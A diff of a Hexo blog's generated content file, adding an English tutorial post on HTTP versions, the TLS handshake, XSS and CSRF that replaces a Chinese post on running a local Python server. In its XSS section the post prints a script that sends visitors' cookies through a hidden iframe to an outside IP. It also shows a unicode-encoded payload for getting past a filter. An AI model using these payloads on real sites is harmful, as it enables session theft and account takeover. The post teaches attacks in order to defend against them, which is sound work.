+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-      <categories>
-        <category>Algorithm/算法</category>
-      </categories>
-      <tags>
-        <tag>Algorithm</tag>
-      </tags>
   </entry>
   <entry>
-    <title>Set up local testing server using Python</title>
-    <url>/en/2021/09/16/Python-localServer/</url>
-    <content><![CDATA[<p><strong>关于使用Python搭建简易本地服务器指南，可用于异步测试等。</strong></p>
+    <title>HTTP &amp; Network Security</title>
+    <url>/en/2021/12/06/HTTP&amp;Network/</url>
+    <content><![CDATA[<p><strong>This article focuses on some common computer networking concepts and summarizes them for future in-depth understanding of web development.</strong></p>
 <a id="more"></a>
 
-<h2 id="测试本地文件的问题"><a href="#测试本地文件的问题" class="headerlink" title="测试本地文件的问题"></a>测试本地文件的问题</h2><ul>
-<li><strong>它们具有异步请求功能</strong>。如果您只是从本地文件运行示例，某些浏览器（包括 Chrome）将不会运行异步请求。这是因为安全限制。</li>
-<li><strong>它们具有服务器端语言</strong>。服务器端语言（例如 PHP 或 Python）需要一个特殊的服务器来解释代码并交付结果。</li>
+<h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h2 id="HTTP-Protocol"><a href="#HTTP-Protocol" class="headerlink" title="HTTP Protocol"></a>HTTP Protocol</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>HTTP is a TCP/IP based <strong>application layer protocol</strong>. It does not involve the transmission of datagrams, but mainly specifies the format of communication between the client and the server, and uses port 80 by default.</p>
+<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><h4 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h4><ul>
+<li><p>1996 - Released</p>
+</li>
+<li><p>Version 1.0 introduced the POST and HEAD commands in addition to the GET command, which was the only one available in version 0.9.</p>
+</li>
+<li><p>HTTP request and response formats, in addition to including <strong>data sections</strong> must also include <strong>header information i.e. HTTP HEADER</strong> (to describe metadata)</p>
+</li>
 </ul>
-<h2 id="利用Python建立简单本地HTTP服务器"><a href="#利用Python建立简单本地HTTP服务器" class="headerlink" title="利用Python建立简单本地HTTP服务器"></a>利用Python建立简单本地HTTP服务器</h2><ul>
-<li><p>安装Python</p>
-</li>
-<li><p>运行命令行（我是mac），输入以下命令检查是否安装：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python --version</span><br></pre></td></tr></table></figure></li>
-<li><p>cd到目标文件目录</p>
-</li>
-<li><p>启动服务器</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure></li>
-<li><p>默认端口号是8000，通过localhost:8000来访问此服务器</p>
-</li>
-<li><p><strong>PS:</strong> 切换端口号使用如下命令（以7800端口号为例）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7800</span><br></pre></td></tr></table></figure></li>
+<h4 id="request-format"><a href="#request-format" class="headerlink" title="request format"></a>request format</h4><p>Request command + multi-line headers</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.0 request command</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5) Multi-line headers</span><br><span class="line">Accept: *&#x2F;* Multi-line headers</span><br></pre></td></tr></table></figure>
+<h4 id="Response-format"><a href="#Response-format" class="headerlink" title="Response format"></a>Response format</h4><p>Header + blank line + data. First line is protocol version + status code + status description</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK first line</span><br><span class="line">Content-Type: text&#x2F;plain from here onwards is the header</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line">        											This is a blank line</span><br><span class="line">&lt;html&gt; Data from here onwards</span><br><span class="line">  &lt;body&gt;Hello World&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="Content-Type-field"><a href="#Content-Type-field" class="headerlink" title="Content-Type field"></a>Content-Type field</h4><p>The headers are ASCII, but the data can be in any format. Therefore <strong><code>Content-Type</code> is needed to tell the client the format of this data</strong>.</p>
+<p>Common <code>Content-Type</code> field values are as follows.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;plain</span><br><span class="line">text&#x2F;html</span><br><span class="line">text&#x2F;css</span><br><span class="line">image&#x2F;jpeg</span><br><span class="line">image&#x2F;png</span><br><span class="line">image&#x2F;svg+xml</span><br><span class="line">audio&#x2F;mp4</span><br><span class="line">video&#x2F;mp4</span><br><span class="line">application&#x2F;javascript</span><br><span class="line">application&#x2F;pdf</span><br><span class="line">application&#x2F;zip</span><br><span class="line">application&#x2F;atom+xml</span><br></pre></td></tr></table></figure>
+<p>These data types are collectively known as <strong>MIME type</strong> and are in the format: primary type/secondary type.</p>
+<h4 id="Content-Encoding-field"><a href="#Content-Encoding-field" class="headerlink" title="Content-Encoding field"></a>Content-Encoding field</h4><p>As <strong>the data sent can be in any format</strong>, it is possible to compress the data before sending it. The <strong><code>Content-Encoding</code> field describes how the data is compressed</strong>. Common compression methods.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
+<p>Also** when the client requests**, it can specify the compression method it <strong>accepts</strong>, using the <strong>field <code>Accept-Encoding</code></strong>. as follows.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
+<h4 id="Disadvantages"><a href="#Disadvantages" class="headerlink" title="Disadvantages"></a>Disadvantages</h4><p>The main problem with HTTP/1.0 is that: <strong>only one request can be sent per TCP connection</strong>. Once the data is sent, the link is closed. To request another resource, another TCP connection must be created. The TCP connection requires three handshakes between the client and the server, and starts off slowly due to slow start, making it costly to create a new TCP connection.</p>
+<p>** To solve this problem, some browsers use the non-standard field <code>Connection</code>. **</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+<p>The above field requires the server not to close the TCP connection so that other requests can reuse it, and that reusable TCP connection will not be disconnected until either the client or the server actively closes it. However, this method is not standard.</p>
+<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>Used from 1997 to 201 several, until HTTPS.</p>
+<h4 id="Persistent-connections"><a href="#Persistent-connections" class="headerlink" title="Persistent connections"></a>Persistent connections</h4><ul>
+<li>The <strong>biggest change</strong> in version 1.1 was the introduction of <strong>persistent connection</strong>, i.e. TCP connections are not closed by default, can be reused by multiple requests and do not need to declare <code>Connection:keep-alive</code>.</li>
+<li>A connection is actively closed when there has been no communication between the client and the server for a period of time. However, the normative practice is for the client to send <code>Connection: close</code> on the last request, explicitly asking the server to close the TCP connection.</li>
 </ul>
-<p><em><strong>最后， Python的http.server只是静态文件服务器，他无法运行python、php、javascript等语言的代码，所以要在本地运行服务器端语言代码，可以使用Python Web框架，比如Django等</strong></em></p>
+<p>**Note: **For the same domain name, most browsers allow <strong>6 persistent connections</strong> to be established at the same time.</p>
+<h4 id="Pipeline-mechanism"><a href="#Pipeline-mechanism" class="headerlink" title="Pipeline mechanism"></a>Pipeline mechanism</h4><p>In version 1.0, within the same TCP connection, if a client wanted to <strong>request two resources</strong>, it would <strong>send request A</strong> first, then wait for the server to respond, <strong>and then send request B</strong> after receiving the response**.</p>
+<p>In version 1.1 the <strong>pipelining</strong> mechanism was introduced, which allows the browser to <strong>send both an A request and a B request</strong>, but the server still responds to the A request first, in order, and then to the B request when it is done.</p>
+<p>Thus, the pipelining mechanism allows <strong>clients to send multiple requests</strong> at the same time over the same TCP connection.</p>
+<h4 id="Content-Length-field"><a href="#Content-Length-field" class="headerlink" title="Content-Length field"></a>Content-Length field</h4><p>** Used to declare the length of the data for this response. **</p>
+<h4 id="chunked-transfer-encoding"><a href="#chunked-transfer-encoding" class="headerlink" title="chunked-transfer-encoding"></a>chunked-transfer-encoding</h4><p>In short, it means that the server <strong>sends a piece of data as it is generated</strong>, i.e. it uses the stream mode instead of the buffer mode.</p>
+<p>Therefore, version 1.1 can use chunked transfer encoding instead of the <code>Content-Length</code> field. Whenever <strong>a request or response has a <code>Transfer-Encoding</code> field</strong> in its header, it indicates that the response will consist of an undetermined number of chunks of data.</p>
+<p><strong>Note:</strong> Each non-empty block of data will be preceded by a hexadecimal value to indicate the length of the block. It ends with a block of size 0, indicating that the data for this response has been sent. Examples are as follows.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"></span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<h4 id="Other-features"><a href="#Other-features" class="headerlink" title="Other features"></a>Other features</h4><ul>
+<li>Version 1.1 also adds many new verb methods such as <code>PUT</code>, <code>PATCH</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>DELETE</code></li>
+<li>A new <code>HOST</code> field** has been added to the client request headers to specify the server’s domain name. With the <code>HOST</code> field it is possible to send a request to a different website on the same server. (Laying the groundwork for the rise of virtual machines)</li>
+</ul>
+<h4 id="Disadvantages-1"><a href="#Disadvantages-1" class="headerlink" title="Disadvantages"></a>Disadvantages</h4><p>There is <strong>Head-of-line blocking</strong>. Although multiplexing of TCP connections is allowed, data communication within the <strong>same TCP connection is still sequential</strong> and the server can only respond to the next request after processing the response to the first one. If the response to the previous request is slow, then there will be many requests queued up behind it.</p>
+<p>Ways to avoid queue head blocking are.</p>
+<ol>
+<li><strong>reduce the number of requests</strong>. For example, merging scripts and stylesheets, embedding images in CSS code</li>
+<li><strong>Multiple simultaneous persistent connections</strong>. For example, domain sharding, where the required downloads can come from multiple domains, can solve the concurrency limit.</li>
+</ol>
+<h3 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h3><h4 id="Binary-protocol"><a href="#Binary-protocol" class="headerlink" title="Binary protocol"></a>Binary protocol</h4><p>HTTP/1.1 has a text (ASCII) header and a text or binary data body. HTTP/2, however, is a <strong>thoroughly binary protocol</strong>, where both the header and the data body are binary, and are collectively referred to as “frames”: header frames and data frames.</p>
+<p>The advantage of the binary protocol is that additional frames can be defined.</p>
+<h4 id="Multiplexing"><a href="#Multiplexing" class="headerlink" title="Multiplexing"></a>Multiplexing</h4><p>In HTTP/2, both the client and the browser can send multiple requests and responses at the same time over the same TCP connection, without having to correspond to each other in order, thus avoiding the problem of queue head blocking.</p>
+<p>For example, in a TCP connection, the server receives both request A and request B. It responds to request A first, which turns out to be very time-consuming to process, so it sends the part of request A that has already been processed, then processes the response to request B, and when it’s done, it processes the rest of the request that sent A. We call this <strong>duplex, real-time communication</strong> <strong>multiplex</strong>.</p>
+<h4 id="data-flow"><a href="#data-flow" class="headerlink" title="data flow"></a>data flow</h4><p>In HTTP/2, <strong>packets are sent out of order</strong>; consecutive packets inside the same connection may belong to different responses, so it is necessary to <strong>mark</strong> the packet to indicate which response it belongs to.</p>
+<p>HTTP/2 refers to <strong>all packets</strong> of each request or response as a <strong>stream</strong>. Each stream is given a unique number. When a packet is sent, it must be marked with a stream ID that identifies which stream it belongs to. In addition, all stream IDs sent by the client are odd numbers and all stream IDs sent by the server are even numbers.</p>
+<p>When the stream is sent halfway, both the client and the server can signal the stream to be cancelled. In HTTP/1.1, the only way to cancel a stream was to close the TCP connection. HTTP/2 can cancel a request while ensuring that the TCP connection is still open and can be reused for other requests.</p>
+<p>The client can also specify the priority of the data stream, the higher the priority the sooner the server will respond to it.</p>
+<h4 id="header-compression"><a href="#header-compression" class="headerlink" title="header compression"></a>header compression</h4><p>As many fields in the <strong>request headers are repeated in each request</strong> (e.g. Cookie, User Agent, etc.), this can result in a lot of wasted bandwidth. HTTP/2 optimises this by introducing <strong>header compression</strong>. On the one hand, headers <strong>are compressed using methods such as <code>gzip</code></strong> before being sent; on the other hand, the client and server maintain a <strong>header table</strong> which is a mapping of <strong>fields and index numbers</strong>, after which only the index numbers are sent to improve speed.</p>
+<h4 id="Server-Push"><a href="#Server-Push" class="headerlink" title="Server Push"></a>Server Push</h4><p>HTTP/2 allows the server to send resources to the client unsolicited without receiving a request.</p>
+<p>For example, if a client requests a web page containing many static resources, the server will actively send these static resources to the client along with the web page, so that there is no need to wait for the client to receive the web page and parse the HTML to find static resources before requesting static resources.</p>
+<h2 id="HTTPS-Extra"><a href="#HTTPS-Extra" class="headerlink" title="HTTPS - Extra"></a>HTTPS - Extra</h2><p>The security of Internet communications is built on the <strong>SSL/TLS</strong> protocol.</p>
+<p><strong>Note</strong>: SSL - <strong>Secure Sockets Layer</strong>, TLS - an upgrade from SSL</p>
+<h3 id="Reasons-for-using-HTTPS-amp-what-it-does"><a href="#Reasons-for-using-HTTPS-amp-what-it-does" class="headerlink" title="Reasons for using HTTPS &amp; what it does"></a>Reasons for using HTTPS &amp; what it does</h3><p><strong>Comparison:</strong></p>
+<ul>
+<li><p>HTTP does not use SSL/TLS and is therefore unencrypted communication, all information is transmitted in clear text</p>
+<ol>
+<li><strong>Eavesdropping risk:</strong> third parties can intercept and be informed of the content of communications</li>
+<li><strong>tampering:</strong> third parties can intercept and modify the content of communications</li>
+<li><strong>pretending:</strong> a third party can impersonate another person to participate in the communication</li>
+</ol>
+</li>
+<li><p>Benefits of HTTPS based on SSL/TLS protocol</p>
+<ol>
+<li><strong>All messages are transmitted encrypted</strong> - no eavesdropping</li>
+<li><strong>with a checksum mechanism</strong> - any tampering with the content of the communication can be detected by both parties to the communication</li>
+<li><strong>Equipped with a certificate of identity</strong> - prevents identity impersonation</li>
+</ol>
+</li>
+</ul>
+<h3 id="The-basic-operation-of-the-SSL-TLS-protocol"><a href="#The-basic-operation-of-the-SSL-TLS-protocol" class="headerlink" title="The basic operation of the SSL/TLS protocol"></a>The basic operation of the SSL/TLS protocol</h3><p>The basic idea of the protocol is:** asymmetric encryption: public key encryption, private key decryption**. That is, the client first asks the server for the public key, then encrypts the message with the public key, and the server receives the ciphertext and decrypts it with its own private key.</p>
+<ol>
+<li><p><strong>How to ensure that the public key cannot be tampered with?</strong></p>
+<p>Answer: <strong>Put the public key into the digital certificate</strong>, as long as the certificate is trusted, then the public key is trusted.</p>
+</li>
+<li><p><strong>How to reduce the time required for encryption with a public key that is too computationally intensive?</strong></p>
+<p>Answer: For each conversation (session), the client and the server will generate a “conversation key” (session key), which will be used to encrypt the message. As the session key is a symmetric encryption, it is very fast, so if the server public key is only used to encrypt the session key itself, the time consumed for encryption is greatly reduced.</p>
+</li>
+</ol>
+<p>So, the basic process of the SSL/TLS protocol is</p>
+<ol>
+<li>the client requests and verifies the public key <strong>from the server</strong> - the handshake phase</li>
+<li>both parties negotiate <strong>to generate a “conversation key “</strong></li>
+<li>both parties use the “conversation key “ <strong>for encrypted communication</strong></li>
+</ol>
+<h3 id="Handshake-phase"><a href="#Handshake-phase" class="headerlink" title="Handshake phase"></a>Handshake phase</h3><p>The handshake phase involves four communications and all communications during this phase are in plaintext.</p>
+<h4 id="Phase-1-The-client-sends-a-request"><a href="#Phase-1-The-client-sends-a-request" class="headerlink" title="Phase 1: The client sends a request"></a>Phase 1: The client sends a request</h4><p>First, the client sends an encrypted communication request to the server. The request it sends is mainly about the following.</p>
+<ol>
+<li>the supported protocol version, e.g. TLS 1.0</li>
+<li>a random number generated by the client to be used later to generate a “conversation key”</li>
+<li>the encryption method supported, e.g. RSA public key encryption</li>
+<li>supported compression methods</li>
+</ol>
+<h4 id="Phase-2-Server-Response"><a href="#Phase-2-Server-Response" class="headerlink" title="Phase 2: Server Response"></a>Phase 2: Server Response</h4><p>The server receives a request from the client and sends a response to the client. The response mainly includes the following.</p>
+<ol>
+<li>confirmation of the version of the encrypted communication protocol used. If the two sides do not support the same version, the server will close this encrypted communication</li>
+<li>a random number generated by the server to be used later to generate the “conversation key”</li>
+<li>confirmation of the encryption method used</li>
+<li>the server certificate</li>
+</ol>
+<h4 id="Phase-3-Client-Response"><a href="#Phase-3-Client-Response" class="headerlink" title="Phase 3: Client Response"></a>Phase 3: Client Response</h4><p>When the client receives the response from the server, it first verifies the server’s digital certificate.</p>
+<p>If <strong>1. the certificate is not credible. 2. the domain name in the certificate does not match the actual domain name. 3. the certificate has expired</strong>, a warning is displayed to the visitor, giving him/her the option to continue the communication or not.</p>
+<p>If there is no problem with the certificate, the client will <strong>take the server’s public key</strong> from the certificate and send a response to the server with the following main contents.</p>
+<ol>
+<li>A random number generated by the client. The random number is encrypted with the public key to prevent eavesdropping.</li>
+<li>A notification of the change in encoding. Indicates that subsequent messages will be sent using the mutually agreed encryption method and key.</li>
+<li>client end of handshake notification. Indicates the end of the client’s handshake phase, this item is also the hash value of all content sent earlier and is used for server verification.</li>
+</ol>
+<p><strong>Note:</strong> The random number generated in this phase is the third random number (“pre-master key”) that appears throughout the handshake phase. With this, both the client and the server have three random numbers at the same time, and then each side generates the same “session key” for the session, using a pre-agreed encryption method.</p>
+<h4 id="Phase-4-Final-server-response"><a href="#Phase-4-Final-server-response" class="headerlink" title="Phase 4: Final server response"></a>Phase 4: Final server response</h4><p>Once the server has received the third random number, it calculates and generates the “session key” for the current session. A final response is then sent to the client. The main contents are as follows.</p>
+<ol>
+<li>Notification of code change. This indicates that the subsequent message will be sent with the agreed encryption method and key. 2.</li>
+<li>End of server handshake notification. Indicates that the handshake phase of the server has ended. This item is also the hash value of all the content sent earlier and is used for verification by the client.</li>
+</ol>
+<p>At this point, the entire handshake phase is complete. Next, the client and server communicate encrypted, which is <strong>exactly the same as the normal HTTP protocol</strong>, <strong>except that all sent content is encrypted using the “session key”</strong>.</p>
+<h2 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h2><h3 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS - Cross Site Scripting"></a>XSS - Cross Site Scripting</h3><h4 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h4><p>XSS, known as <strong>Cross-site scripting</strong>, or cross-site scripting in Chinese, is a type of <strong>attack</strong> on the security vulnerability of web applications, i.e. a type of <strong>code injection</strong>. This type of attack usually involves both HTML and user scripting languages (mainly JavaScript).</p>
+<p>For example, posting a malicious piece of JavaScript code on a web forum in JavaScript is a script injection, while at the same time if the content of this code has the ability to request an external server, then it is called XSS.</p>
+<p>Therefore, it can be understood as <strong>XSS (cross-site scripting) = script injection + the ability to request an external server</strong>.</p>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>For example, the following code is written for posting content in a forum site.</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  while (true) &#123;</span><br><span class="line">    alert(&#x27;keep popping up windows&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Assuming the forum site has no filtering or other defence mechanisms, any user visiting this thread will have this pop-up popping up all the time in the client interface.</p>
+<p>**This is script injection in its simplest form. **Of course this script is not substantially more harmful then XSS is based on a script injection method to accomplish this, but it is injecting a script that contains a request for cross-site functionality.</p>
+<p>For example, in the forum site mentioned above, the following code is injected.</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  (function(window, document) &#123;</span><br><span class="line">    // Construct the URL for the leaked information</span><br><span class="line">    var cookies = document.cookie;</span><br><span class="line">    var xssURIBase = &quot;http://192.168.123.123/myxss/&quot;;</span><br><span class="line">    var xssURI = xssURIBase + window.encodeURI(cookies);</span><br><span class="line">    // Create a hidden iframe for communication</span><br><span class="line">    var hideFrame = document.createElement(&quot;iframe&quot;);</span><br><span class="line">    hideFrame.height = 0;</span><br><span class="line">    hideFrame.width = 0;</span><br><span class="line">    hideFrame.style.display = &quot;none&quot;;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    // start</span><br><span class="line">    document.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(window, document);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>This code will pass the cookie of any user who visits the post to a server with the name <code>http://192.168.123.123/myxss/</code>, which can then take this cookie and visit the corresponding website and log into the user’s account, which can then perform other operations.</p>
+<p>Therefore, the above code is XSS.</p>
+<h3 id="CSRF-Cross-Site-Request-Forgery"><a href="#CSRF-Cross-Site-Request-Forgery" class="headerlink" title="CSRF - Cross Site Request Forgery"></a>CSRF - Cross Site Request Forgery</h3><h4 id="Introduction-3"><a href="#Introduction-3" class="headerlink" title="Introduction"></a>Introduction</h4><p>CSRF, known as <strong>Cross-site request forgery</strong>, is a form of cross-site request forgery. It is an attack method that allows a user to perform some unintended actions** (such as name change, post deletion, emailing, etc.) on a currently logged-in web application.</p>
+<h4 id="Attack-Principle"><a href="#Attack-Principle" class="headerlink" title="Attack Principle"></a>Attack Principle</h4><p>Generally speaking, CSRF is implemented by XSS, on top of cross-site scripting, to implement forged requests, causing the victim to perform actions that he or she would not have intended to perform.</p>
+<p>**Note: CSRF can also be implemented without XSS. **</p>
+<h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><p>After the external server has successfully obtained the user’s cookie, it can use the cookie to forge a series of requests to the forum website, such as changing the user’s name, changing the user’s password, etc. At this point, the attack can be called a CSRF.</p>
+<h3 id="Protection-against-XSS-and-CSRF-⭐️"><a href="#Protection-against-XSS-and-CSRF-⭐️" class="headerlink" title="Protection against XSS and CSRF ⭐️"></a>Protection against XSS and CSRF ⭐️</h3><p><em><strong>Core idea: don’t trust any external source data!!!</strong></em></p>
+<p>Generally speaking, most CSRF is based on XSS, so it can be said that by defending against XSS, you are basically defending against CSRF as well.</p>
+<p>For the prevention of XSS, there are two main methods as follows.</p>
+<ol>
+<li><strong>Input filtering: thorough sensitive character filtering of external input</strong> - front end + back end</li>
+<li><strong>Output filtering: when displayed on the page, do some processing so that sensitive code scripts cannot be executed smoothly</strong> - front-end</li>
+</ol>
+<p>Theoretically, wherever there is input data, there is an XSS vulnerability. JavaScript scripts can be injected into the database in various forms (e.g. plaintext, encoded, etc.).</p>
+<p>As mentioned above JS can be injected in a variety of illegal forms, the main illegal forms are of two types.</p>
+<ol>
+<li><p><strong>Plaintext:</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  ... <span class="comment">// js malicious code</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>To handle the filtering of plaintext injections.</p>
+</li>
+<li><p><strong>Coding:</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">u0026u006cu0074u003bu0073u0063u0072u0069u0070u0074u0026u0067u0074u003bu0061u006cu0065u0072u0074u0028u0026u0023u0033u0039u003bu6211u662fu0078u0073u0073uff0cu4f60u6709u9ebbu70e6u4e86u0026u0023u0033u0039u003bu0029u0026u006cu0074u003bu002fu0073u0063u0072u0069u0070u0074u0026u0067u0074u003b</span><br></pre></td></tr></table></figure>
+<p>The above encoding is unicode, which bypasses the <code>htmlSpecialChars</code> filter and is imported into the library, and then when the message is displayed, the html automatically converts the unicode encoding into plaintext, i.e. a real executable script.</p>
+<p>Since not only unicode can be injected, but other types of encoding as well (for similar reasons), we need to try to set the character encoding of the page to one (e.g. unicode: utf-8) so that we can focus on unicode injection.</p>
+</li>
+</ol>
+<h4 id="Some-other-general-prevention-methods"><a href="#Some-other-general-prevention-methods" class="headerlink" title="Some other general prevention methods"></a>Some other general prevention methods</h4><ol>
+<li><p>add the <code>Http Header</code> of the <code>Content Security Policy</code> to the output html</p>
+<p>What it does: Prevents the page from being embedded in a third-party script file when attacked by XSS</p>
+</li>
+<li><p>add <code>HttpOnly</code> parameter when setting cookies</p>
+<p>Function: To prevent cookie information from being stolen when the page is attacked by XSS</p>
+<p>Disadvantage: the website’s own <code>JavaScript</code> code cannot manipulate cookies</p>
+</li>
+<li><p>check the Referer parameter of the request when developing the API</p>
+<p>Effect: It can prevent CSRF attacks to a certain extent</p>
+</li>
+</ol>
 ]]></content>
       <categories>
-        <category>Frontend/前端</category>
+        <category>Network</category>
       </categories>
       <tags>
-        <tag>Server</tag>
+        <tag>HTTP</tag>
       </tags>
   </entry>
   <entry>
@@ -1184,191 +1369,6 @@
       </categories>
       <tags>
         <tag>JavaScript</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTTP &amp; Network Security</title>
-    <url>/en/2021/12/06/HTTP&amp;Network/</url>
-    <content><![CDATA[<p><strong>This article focuses on some common computer networking concepts and summarizes them for future in-depth understanding of web development.</strong></p>
-<a id="more"></a>
-
-<h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h2 id="HTTP-Protocol"><a href="#HTTP-Protocol" class="headerlink" title="HTTP Protocol"></a>HTTP Protocol</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>HTTP is a TCP/IP based <strong>application layer protocol</strong>. It does not involve the transmission of datagrams, but mainly specifies the format of communication between the client and the server, and uses port 80 by default.</p>
-<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><h4 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h4><ul>
-<li><p>1996 - Released</p>
-</li>
-<li><p>Version 1.0 introduced the POST and HEAD commands in addition to the GET command, which was the only one available in version 0.9.</p>
-</li>
-<li><p>HTTP request and response formats, in addition to including <strong>data sections</strong> must also include <strong>header information i.e. HTTP HEADER</strong> (to describe metadata)</p>
-</li>
-</ul>
-<h4 id="request-format"><a href="#request-format" class="headerlink" title="request format"></a>request format</h4><p>Request command + multi-line headers</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.0 request command</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5) Multi-line headers</span><br><span class="line">Accept: *&#x2F;* Multi-line headers</span><br></pre></td></tr></table></figure>
-<h4 id="Response-format"><a href="#Response-format" class="headerlink" title="Response format"></a>Response format</h4><p>Header + blank line + data. First line is protocol version + status code + status description</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK first line</span><br><span class="line">Content-Type: text&#x2F;plain from here onwards is the header</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line">        											This is a blank line</span><br><span class="line">&lt;html&gt; Data from here onwards</span><br><span class="line">  &lt;body&gt;Hello World&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="Content-Type-field"><a href="#Content-Type-field" class="headerlink" title="Content-Type field"></a>Content-Type field</h4><p>The headers are ASCII, but the data can be in any format. Therefore <strong><code>Content-Type</code> is needed to tell the client the format of this data</strong>.</p>
-<p>Common <code>Content-Type</code> field values are as follows.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;plain</span><br><span class="line">text&#x2F;html</span><br><span class="line">text&#x2F;css</span><br><span class="line">image&#x2F;jpeg</span><br><span class="line">image&#x2F;png</span><br><span class="line">image&#x2F;svg+xml</span><br><span class="line">audio&#x2F;mp4</span><br><span class="line">video&#x2F;mp4</span><br><span class="line">application&#x2F;javascript</span><br><span class="line">application&#x2F;pdf</span><br><span class="line">application&#x2F;zip</span><br><span class="line">application&#x2F;atom+xml</span><br></pre></td></tr></table></figure>
-<p>These data types are collectively known as <strong>MIME type</strong> and are in the format: primary type/secondary type.</p>
-<h4 id="Content-Encoding-field"><a href="#Content-Encoding-field" class="headerlink" title="Content-Encoding field"></a>Content-Encoding field</h4><p>As <strong>the data sent can be in any format</strong>, it is possible to compress the data before sending it. The <strong><code>Content-Encoding</code> field describes how the data is compressed</strong>. Common compression methods.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
-<p>Also** when the client requests**, it can specify the compression method it <strong>accepts</strong>, using the <strong>field <code>Accept-Encoding</code></strong>. as follows.</p>
